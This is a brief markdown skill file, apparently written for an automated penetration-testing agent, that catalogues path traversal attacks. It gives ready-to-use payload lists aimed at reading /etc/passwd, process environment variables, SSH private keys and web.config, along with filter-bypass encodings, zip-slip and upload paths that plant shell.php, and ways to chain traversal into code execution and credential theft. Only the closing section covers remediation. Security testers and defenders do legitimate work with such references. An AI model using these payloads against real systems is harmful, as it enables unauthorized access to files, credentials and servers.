---
name: path_traversal
description: Directory traversal for arbitrary file read and write via path manipulation
---

# Path Traversal

## Attack Surface
- File download/view endpoints accepting user-controlled filenames or paths
- Template loaders, log viewers, backup/export endpoints, static file handlers
- Archive extraction (ZIP, TAR) vulnerable to zip-slip via crafted member paths

## Detection Techniques
- Inject `../../../etc/passwd` (Linux) or `..\..\..\windows\win.ini` (Windows)
- Test encoded variants: `%2e%2e%2f`, `%252e%252e%252f`, `..%c0%af` (overlong UTF-8)
- Null bytes: `../../etc/passwd%00.png`; fuzz params: file, path, page, template

## Common Payloads

```
# Linux targets
../../../etc/passwd
../../../proc/self/environ
../../../home/user/.ssh/id_rsa

# Windows targets
..\..\..\windows\win.ini
..\..\..\inetpub\wwwroot\web.config

# URL-encoded / double-encoded
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd

# Overlong UTF-8 / null byte / filename traversal
..%c0%af..%c0%af..%c0%afetc/passwd
../../../etc/passwd%00.png
filename="../../../../var/www/html/shell.php"
..;/WEB-INF/web.xml
```

## Bypass Techniques
- Nested traversal: `....//` or `..././` surviving single-pass `../` stripping
- Mixed separators: `..\/`, backslash on Windows `..\..\..\`
- Java/Tomcat: `..;/` treated as `../` by servlet container
- Null byte `%00` to truncate extension; absolute path `/etc/passwd` directly
- UTF-8 overlong: `%c0%ae` for `.`; double encoding for double-decode apps
- Zip-slip: archive entries with `../../../var/www/shell.php`

## Exploit Chaining
- Traversal + LFI to RCE: read log files, poison with PHP code, then include
- Traversal + source disclosure: read app source to find further vulnerabilities
- Traversal + config read: obtain DB credentials or API keys from config files

## Remediation
- Canonicalize paths and verify result is within expected base directory
- Allowlist filenames or use indirect references (IDs, maps) instead of raw paths
- Reject input containing `..`, `%2e`, or path separators
- Minimal filesystem permissions; chroot or containerization
